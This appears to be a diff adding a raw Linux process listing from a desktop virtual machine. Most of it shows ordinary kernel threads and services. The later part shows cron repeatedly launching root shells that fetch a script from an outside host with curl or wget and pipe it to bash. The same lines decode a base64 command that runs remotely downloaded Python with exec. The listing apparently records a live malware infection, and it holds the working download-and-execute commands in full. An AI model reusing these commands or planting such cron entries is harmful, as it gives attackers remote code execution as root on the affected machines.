@@ -1,0 +1,420 @@
+F S UID          PID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
+4 S root           1       0  0  80   0 - 42559 -      Nov22 ?        00:02:20 /sbin/init splash
+1 S root           2       0  0  80   0 -     0 -      Nov22 ?        00:00:00 [kthreadd]
+1 I root           3       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [rcu_gp]
+1 I root           4       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [rcu_par_gp]
+1 I root           6       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [kworker/0:0H-kblockd]
+1 I root           8       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [mm_percpu_wq]
+1 S root           9       2  0  80   0 -     0 -      Nov22 ?        00:00:02 [ksoftirqd/0]
+1 I root          10       2  0  80   0 -     0 -      Nov22 ?        00:00:13 [rcu_sched]
+1 S root          11       2  0 -40   - -     0 -      Nov22 ?        00:00:00 [migration/0]
+1 S root          13       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [cpuhp/0]
+1 S root          14       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [cpuhp/1]
+1 S root          15       2  0 -40   - -     0 -      Nov22 ?        00:00:00 [migration/1]
+1 S root          16       2  0  80   0 -     0 -      Nov22 ?        00:00:01 [ksoftirqd/1]
+1 I root          18       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [kworker/1:0H-kblockd]
+1 S root          19       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [cpuhp/2]
+1 S root          20       2  0 -40   - -     0 -      Nov22 ?        00:00:00 [migration/2]
+1 S root          21       2  0  80   0 -     0 -      Nov22 ?        00:00:04 [ksoftirqd/2]
+1 I root          23       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [kworker/2:0H-kblockd]
+1 S root          24       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [cpuhp/3]
+1 S root          25       2  0 -40   - -     0 -      Nov22 ?        00:00:00 [migration/3]
+1 S root          26       2  0  80   0 -     0 -      Nov22 ?        00:00:01 [ksoftirqd/3]
+1 I root          28       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [kworker/3:0H-kblockd]
+5 S root          30       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [kdevtmpfs]
+1 I root          31       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [netns]
+1 S root          32       2  0  80   0 -     0 -      Nov22 ?        00:00:09 [kauditd]
+1 S root          36       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [khungtaskd]
+1 S root          37       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [oom_reaper]
+1 I root          38       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [writeback]
+1 S root          39       2  0  80   0 -     0 -      Nov22 ?        00:00:01 [kcompactd0]
+1 S root          40       2  0  85   5 -     0 -      Nov22 ?        00:00:00 [ksmd]
+1 S root          41       2  0  99  19 -     0 -      Nov22 ?        00:00:05 [khugepaged]
+1 I root          78       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [kintegrityd]
+1 I root          79       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [kblockd]
+1 I root          80       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [blkcg_punt_bio]
+1 I root          81       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [edac-poller]
+1 I root          82       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [devfreq_wq]
+1 S root          84       2  0  80   0 -     0 -      Nov22 ?        00:00:08 [kswapd0]
+1 I root          85       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [kthrotld]
+1 S root          86       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/24-pciehp]
+1 S root          87       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/25-pciehp]
+1 S root          88       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/26-pciehp]
+1 S root          89       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/27-pciehp]
+1 S root          90       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/28-pciehp]
+1 S root          91       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/29-pciehp]
+1 S root          92       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/30-pciehp]
+1 S root          93       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/31-pciehp]
+1 S root          94       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/32-pciehp]
+1 S root          95       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/33-pciehp]
+1 S root          96       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/34-pciehp]
+1 S root          97       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/35-pciehp]
+1 S root          98       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/36-pciehp]
+1 S root          99       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/37-pciehp]
+1 S root         100       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/38-pciehp]
+1 S root         101       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/39-pciehp]
+1 S root         102       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/40-pciehp]
+1 S root         103       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/41-pciehp]
+1 S root         104       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/42-pciehp]
+1 S root         105       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/43-pciehp]
+1 S root         106       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/44-pciehp]
+1 S root         107       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/45-pciehp]
+1 S root         108       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/46-pciehp]
+1 S root         109       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/47-pciehp]
+1 S root         110       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/48-pciehp]
+1 S root         111       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/49-pciehp]
+1 S root         112       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/50-pciehp]
+1 S root         113       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/51-pciehp]
+1 S root         114       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/52-pciehp]
+1 S root         115       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/53-pciehp]
+1 S root         116       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/54-pciehp]
+1 S root         117       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/55-pciehp]
+1 I root         118       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [acpi_thermal_pm]
+1 I root         119       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [ipv6_addrconf]
+1 I root         130       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [kstrp]
+1 I root         134       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [zswap-shrink]
+1 I root         135       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [kworker/u65:0]
+1 I root         179       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [ata_sff]
+1 I root         180       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [cryptd]
+1 S root         181       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [scsi_eh_0]
+1 I root         182       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [mpt_poll_0]
+1 I root         186       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [scsi_tmf_0]
+1 S root         187       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [scsi_eh_1]
+1 I root         188       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [scsi_tmf_1]
+1 S root         191       2  0   9   - -     0 -      Nov22 ?        00:00:00 [irq/16-vmwgfx]
+1 I root         192       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [mpt/0]
+1 I root         193       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [ttm_swap]
+1 I root         266       2  0  60 -20 -     0 -      Nov22 ?        00:00:11 [kworker/0:1H-kblockd]
+1 S root         268       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [scsi_eh_2]
+1 I root         269       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [scsi_tmf_2]
+1 I root         273       2  0  60 -20 -     0 -      Nov22 ?        00:00:11 [kworker/1:1H-kblockd]
+1 I root         277       2  0  60 -20 -     0 -      Nov22 ?        00:00:01 [kworker/3:1H-kblockd]
+1 S root         320       2  0  80   0 -     0 -      Nov22 ?        00:00:03 [jbd2/sda1-8]
+1 I root         321       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [ext4-rsv-conver]
+1 I root         322       2  0  60 -20 -     0 -      Nov22 ?        00:00:16 [kworker/2:1H-kblockd]
+1 I root         368       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [rpciod]
+1 I root         369       2  0  60 -20 -     0 -      Nov22 ?        00:00:00 [xprtiod]
+4 S root         372       1  0  80   0 - 78599 -      Nov22 ?        00:01:12 /lib/systemd/systemd-journald
+1 S root         385       1  0  80   0 - 37612 -      Nov22 ?        00:00:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
+4 S root         400       1  0  80   0 -  5586 -      Nov22 ?        00:00:00 /lib/systemd/systemd-udevd
+4 S root         534       1  0  80   0 -  2026 -      Nov22 ?        00:00:02 /usr/sbin/haveged --Foreground --verbose=1 -w 1024
+4 S root         538       1  0  80   0 - 40636 -      Nov22 ?        00:01:18 /usr/bin/vmtoolsd
+4 S root         541       1  0  80   0 -  1657 -      Nov22 ?        00:00:00 /usr/sbin/cron -f
+4 S message+     542       1  0  80   0 -  1986 -      Nov22 ?        00:00:19 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+4 S root         543       1  0  80   0 - 63131 -      Nov22 ?        00:00:02 /usr/sbin/NetworkManager --no-daemon
+4 S root         545       1  0  80   0 - 58556 -      Nov22 ?        00:00:00 /usr/lib/policykit-1/polkitd --no-debug
+4 S root         547       1  0  80   0 - 55454 -      Nov22 ?        00:00:01 /usr/sbin/rsyslogd -n -iNONE
+4 S root         548       1  0  80   0 -  2511 -      Nov22 ?        00:00:00 /usr/sbin/smartd -n
+4 S root         550       1  0  80   0 -  4236 -      Nov22 ?        00:00:06 /lib/systemd/systemd-logind
+4 S root         577       1  0  80   0 - 77478 -      Nov22 ?        00:00:00 /usr/sbin/lightdm
+4 S root         592       1  0  80   0 - 78320 -      Nov22 ?        00:00:00 /usr/sbin/ModemManager --filter-policy=strict
+4 S root         596       1  0  80   0 -   664 -      Nov22 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+4 S root         597     577  0  80   0 - 116153 -     Nov22 tty7     00:00:35 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+4 S rtkit        736       1  0  81   1 - 38184 -      Nov22 ?        00:00:01 /usr/libexec/rtkit-daemon
+4 S root         769     577  0  80   0 - 40923 -      Nov22 ?        00:00:00 lightdm --session-child 14 21
+4 S root         777       1  0  80   0 -  4608 -      Nov22 ?        00:00:00 /lib/systemd/systemd --user
+5 S root         778     777  0  80   0 - 41976 -      Nov22 ?        00:00:00 (sd-pam)
+4 S root         796     777  0  69 -11 - 157711 -     Nov22 ?        00:00:00 /usr/bin/pulseaudio --daemonize=no
+4 S root         802     769  0  80   0 - 69171 -      Nov22 ?        00:00:00 xfce4-session
+4 S root         810     777  0  80   0 -  1889 -      Nov22 ?        00:00:17 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+1 S root         837     802  0  80   0 -  1475 -      Nov22 ?        00:00:00 /usr/bin/ssh-agent x-session-manager
+4 S root         847     777  0  80   0 - 77262 -      Nov22 ?        00:00:00 /usr/libexec/at-spi-bus-launcher
+0 S root         852     847  0  80   0 -  1782 -      Nov22 ?        00:00:00 /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/accessibility.conf --nofork --print-address 3
+4 S root         856     777  0  80   0 - 57474 -      Nov22 ?        00:00:00 /usr/lib/x86_64-linux-gnu/xfce4/xfconf/xfconfd
+4 S root         861     777  0  80   0 - 42679 -      Nov22 ?        00:00:00 /usr/libexec/at-spi2-registryd --use-gnome-session
+4 S root         868     777  0  80   0 - 20236 -      Nov22 ?        00:00:00 /usr/bin/gpg-agent --supervised
+4 S root         870     802  0  80   0 - 99551 -      Nov22 ?        00:00:05 xfwm4
+4 S root         873     777  0  80   0 - 59177 -      Nov22 ?        00:00:00 /usr/libexec/gvfsd
+5 S root         880       1  0  80   0 - 58974 -      Nov22 ?        00:00:00 xfsettingsd
+4 S root         881     802  0  80   0 - 82703 -      Nov22 ?        00:00:04 xfce4-panel
+4 S root         887       1  0  80   0 - 62280 -      Nov22 ?        00:00:00 /usr/libexec/upowerd
+4 S root         889     881  0  80   0 - 79968 -      Nov22 ?        00:00:01 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libwhiskermenu.so 1 14680071 whiskermenu Whisker Menu Show a menu to easily access installed applications
+4 S root         904     881  0  80   0 - 50534 -      Nov22 ?        00:00:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libsystray.so 15 14680073 systray Notification Area Area where notification icons appear
+4 S root         905     881  0  80   0 - 127609 -     Nov22 ?        00:00:51 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libpulseaudio-plugin.so 16 14680074 pulseaudio PulseAudio Plugin Adjust the audio volume of the PulseAudio sound system
+4 S root         906     881  0  80   0 - 60670 -      Nov22 ?        00:00:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libnotification-plugin.so 17 14680075 notification-plugin Notification Plugin Notification plugin for the Xfce panel
+4 S root         907     881  0  80   0 - 60680 -      Nov22 ?        00:00:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libxfce4powermanager.so 18 14680076 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your display
+4 S root         908     881  0  80   0 - 60634 -      Nov22 ?        00:00:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libactions.so 20 14680077 actions Action Buttons Log out, lock or other system actions
+4 S root         917     802  0  80   0 - 173172 -     Nov22 ?        00:00:31 Thunar --daemon
+4 S root         923     777  0  80   0 - 68258 -      Nov22 ?        00:00:00 /usr/lib/x86_64-linux-gnu/xfce4/notifyd/xfce4-notifyd
+4 S root         930     802  0  80   0 - 148343 -     Nov22 ?        00:00:03 xfdesktop
+4 S root         934       1  0  80   0 - 73654 -      Nov22 ?        00:01:27 /usr/bin/vmtoolsd -n vmusr --blockFd 3
+4 S root         935     802  0  80   0 - 48542 -      Nov22 ?        00:00:00 /usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1
+4 S root         940     802  0  80   0 - 58473 -      Nov22 ?        00:00:00 /usr/libexec/geoclue-2.0/demos/agent
+0 S root         950     802  0  80   0 - 17701 -      Nov22 ?        00:00:00 /usr/bin/python3 /usr/share/system-config-printer/applet.py
+4 S root         952     802  0  80   0 - 117752 -     Nov22 ?        00:00:00 nm-applet
+4 S root         956     802  0  80   0 - 68373 -      Nov22 ?        00:00:00 light-locker
+5 S root         959       1  0  80   0 - 49813 -      Nov22 ?        00:00:00 xfce4-power-manager
+4 S root         962     777  0  80   0 - 38945 -      Nov22 ?        00:00:00 /usr/libexec/dconf-service
+4 S root         975     802  0  80   0 - 149275 -     Nov22 ?        00:00:00 xiccd
+4 S colord       980       1  0  80   0 - 60821 -      Nov22 ?        00:00:00 /usr/libexec/colord
+1 S root         984       1  0  80   0 -  5668 -      Nov22 ?        00:00:00 xcape -e Super_L Control_L Escape
+4 S root        1010     777  0  80   0 - 86515 -      Nov22 ?        00:00:00 /usr/libexec/gvfs-udisks2-volume-monitor
+4 S root        1013       1  0  80   0 - 98042 -      Nov22 ?        00:00:00 /usr/lib/udisks2/udisksd
+4 S root        1027     777  0  80   0 - 58174 -      Nov22 ?        00:00:00 /usr/libexec/gvfs-mtp-volume-monitor
+4 S root        1031     777  0  80   0 - 58768 -      Nov22 ?        00:00:00 /usr/libexec/gvfs-gphoto2-volume-monitor
+4 S root        1035     777  0  80   0 - 78442 -      Nov22 ?        00:00:02 /usr/libexec/gvfs-afc-volume-monitor
+4 S root        1040     777  0  80   0 - 58230 -      Nov22 ?        00:00:00 /usr/libexec/gvfs-goa-volume-monitor
+4 S root        1050     873  0  80   0 - 77695 -      Nov22 ?        00:00:00 /usr/libexec/gvfsd-trash --spawner :1.12 /org/gtk/gvfs/exec_spaw/0
+4 S root        1055     777  0  80   0 - 39798 -      Nov22 ?        00:00:02 /usr/libexec/gvfsd-metadata
+4 S root        1063       1  0  80   0 - 109546 -     Nov22 ?        00:00:10 /usr/bin/qterminal
+0 S root        1066    1063  0  80   0 -  2175 -      Nov22 pts/0    00:00:00 /bin/bash
+4 S systemd+    1151       1  0  80   0 -  4608 -      Nov22 ?        00:00:00 /lib/systemd/systemd-networkd
+1 S root        1823       2  0  80   0 -     0 -      Nov22 ?        00:00:00 [audit_prune_tre]
+5 S root        1839       1  0  76  -4 -  3238 -      Nov22 ?        00:00:15 /sbin/auditd
+5 S root        3575     541  0  80   0 -  1934 -      Nov22 ?        00:00:00 /usr/sbin/CRON -f
+4 S root        3577    3575  0  80   0 -   600 -      Nov22 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root        3593    3577  0  80   0 -  1651 -      Nov22 ?        00:00:00 bash -
+0 S root        3594    3593  0  80   0 -  4834 -      Nov22 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+0 S root        3770    3594  0  80   0 -   600 -      Nov22 ?        00:00:00 sh -c echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9iYi5weSIpLnJlYWQoKSkn | base64 -d | bash -
+0 S root        3773    3770  0  80   0 -  1651 -      Nov22 ?        00:00:00 bash -
+0 S root        3774    3773  0  80   0 -  4695 -      Nov22 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/bb.py").read())
+1 S root        5930       1  0  80   0 -    62 -      Nov22 ?        00:00:00 python
+4 S root      635504     873  0  80   0 - 77697 -      03:10 ?        00:00:00 /usr/libexec/gvfsd-network --spawner :1.12 /org/gtk/gvfs/exec_spaw/1
+4 S root      635551     873  0  80   0 - 77997 -      03:10 ?        00:00:00 /usr/libexec/gvfsd-dnssd --spawner :1.12 /org/gtk/gvfs/exec_spaw/3
+5 S root      644381     541  0  80   0 -  1934 -      03:50 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      644385  644381  0  80   0 -   600 -      03:50 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      644426  644385  0  80   0 -  1651 -      03:50 ?        00:00:00 bash -
+0 S root      644427  644426  0  80   0 -  4695 -      03:50 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      644490     541  0  80   0 -  1934 -      03:52 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      644491  644490  0  80   0 -   600 -      03:52 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      644753  644491  0  80   0 -  1651 -      03:52 ?        00:00:00 bash -
+0 S root      644754  644753  0  80   0 -  4834 -      03:52 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      644816     541  0  80   0 -  1934 -      03:54 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      644819  644816  0  80   0 -   600 -      03:54 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      645101  644819  0  80   0 -  1651 -      03:55 ?        00:00:00 bash -
+0 S root      645102  645101  0  80   0 -  4730 -      03:55 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      646459     541  0  80   0 -  1934 -      03:59 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      646461  646459  0  80   0 -   600 -      03:59 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      646470  646461  0  80   0 -  1651 -      03:59 ?        00:00:00 bash -
+0 S root      646471  646470  0  80   0 -  4834 -      03:59 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      646475     541  0  80   0 -  1934 -      04:00 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      646477  646475  0  80   0 -   600 -      04:00 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      646492  646477  0  80   0 -  1651 -      04:00 ?        00:00:00 bash -
+0 S root      646493  646492  0  80   0 -  4695 -      04:00 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      646495     541  0  80   0 -  1934 -      04:01 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      646496  646495  0  80   0 -   600 -      04:01 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      646503  646496  0  80   0 -  1651 -      04:01 ?        00:00:00 bash -
+0 S root      646504  646503  0  80   0 -  4695 -      04:01 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      653303     541  0  80   0 -  1934 -      04:30 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      653305  653303  0  80   0 -   600 -      04:30 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      653691  653305  0  80   0 -  1651 -      04:30 ?        00:00:00 bash -
+0 S root      653692  653691  0  80   0 -  4695 -      04:30 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      655301     541  0  80   0 -  1934 -      04:35 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      655304  655301  0  80   0 -   600 -      04:35 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      655618  655304  0  80   0 -  1651 -      04:35 ?        00:00:00 bash -
+0 S root      655619  655618  0  80   0 -  4730 -      04:35 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      656110     541  0  80   0 -  1934 -      04:38 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      656112  656110  0  80   0 -   600 -      04:38 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      656126  656112  0  80   0 -  1651 -      04:38 ?        00:00:00 bash -
+0 S root      656127  656126  0  80   0 -  4695 -      04:38 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      657134     541  0  80   0 -  1934 -      04:41 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      657139  657134  0  80   0 -   600 -      04:41 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      657147  657139  0  80   0 -  1651 -      04:41 ?        00:00:00 bash -
+0 S root      657148  657147  0  80   0 -  4695 -      04:41 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      657193     541  0  80   0 -  1934 -      04:42 ?        00:00:00 /usr/sbin/CRON -f
+4 S root      657195  657193  0  80   0 -   600 -      04:42 ?        00:00:00 /bin/sh -c (curl -s http://bash.givemexyz.in/xms||wget -q -O - http://bash.givemexyz.in/xms)|bash -sh; echo cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly9iYXNoLmdpdmVtZXh5ei5pbi9kZC5weSIpLnJlYWQoKSkn | base64 -d | bash -; lwp-download http://bash.givemexyz.in/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms
+0 S root      657207  657195  0  80   0 -  1651 -      04:42 ?        00:00:00 bash -
+0 S root      657208  657207  0  80   0 -  4730 -      04:42 ?        00:00:00 python -c import urllib;exec(urllib.urlopen("http://bash.givemexyz.in/dd.py").read())
+5 S root      659195     541  0  80   0 -  1934 -      04:46 ?        00:00:00 /usr/sbin/CRON -f
+5 S root      659196     541  0  80   0 -  1934 -      04:46 ?        00:00:00 /usr/sbin/CRON -f
